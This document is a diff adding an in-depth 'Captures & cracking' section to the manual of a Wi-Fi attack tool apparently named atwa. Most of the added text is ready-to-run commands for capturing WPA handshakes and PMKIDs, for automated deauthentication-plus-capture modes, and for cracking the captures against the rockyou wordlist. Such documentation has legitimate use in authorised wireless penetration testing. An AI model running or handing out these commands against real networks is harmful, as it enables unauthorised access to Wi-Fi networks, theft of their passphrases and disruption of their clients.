@@ -65,10 +65,68 @@ Common flows:
 
 Use **Stop Attack** to abort; attacks check between rounds/frames.
 
-## 7. Captures & cracking
-- Lock a target with clients to start a capture.
-- `handshake`, `pmkid` capture to `~/atwa-hs/<SSID>_<BSSID>/`.
-- Crack with `crack` / `crack-cap` or the Captures panel.
+## 7. Captures & cracking (in depth)
+
+### 7.1 Capture locations
+All captures are stored under:
+```
+~/atwa-hs/<SSID>_<BSSID>/
+```
+Typical files:
+- `handshake-01.cap` (4-way handshake)
+- `pmkid_*.22000` (PMKID line)
+- `lock_*.pcap` (channel-lock captures)
+
+### 7.2 Handshake capture (CLI)
+```bash
+# Capture a 4-way handshake
+sudo atwa handshake --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6
+
+# Verify independently
+sudo atwa verify-handshake ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/handshake-01.cap
+```
+
+### 7.3 PMKID capture (clientless)
+```bash
+sudo atwa pmkid --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6
+# writes pmkid_*.22000
+```
+
+### 7.4 Crack a capture
+```bash
+# From a .cap (handshake)
+sudo atwa crack-cap ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/handshake-01.cap \
+  --wordlist /usr/share/wordlists/rockyou.txt
+
+# From a 22000 (PMKID/hash)
+sudo atwa crack ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/pmkid_*.22000 \
+  --wordlist /usr/share/wordlists/rockyou.txt
+```
+
+### 7.5 Captures panel (GUI)
+- Lock a target with known clients to start a lock capture.
+- Use **Capture** buttons to record handshakes/PMKID.
+- **Crack** runs John/aircrack-ng on the selected file; progress shows in the log.
+- Stop a running crack with **Stop Attack** (terminates the subprocess tree).
+
+### 7.6 Wordlists & formats
+- Handshakes: `.cap` / `.pcap` (verified before cracking).
+- PMKID: `.22000` (hashcat format).
+- Wordlist: any newline-separated text file (e.g., `rockyou.txt`).
+
+### 7.7 OMNI / Smart (automated)
+```bash
+# Smart: PMKID -> deauth + handshake
+sudo atwa smart --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --ssid NET
+
+# Omni: profile -> PMKID -> handshake -> crack
+sudo atwa omni --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --ssid NET --wordlist rockyou.txt
+```
+
+### 7.8 Tips
+- Verify handshakes before cracking to avoid wasted time.
+- Use a strong wordlist; PMKID is often faster than handshake capture.
+- Captures persist across sessions under `~/atwa-hs/`.
 
 ## 8. WPS
 - `wps-recon` lists WPS-enabled APs.
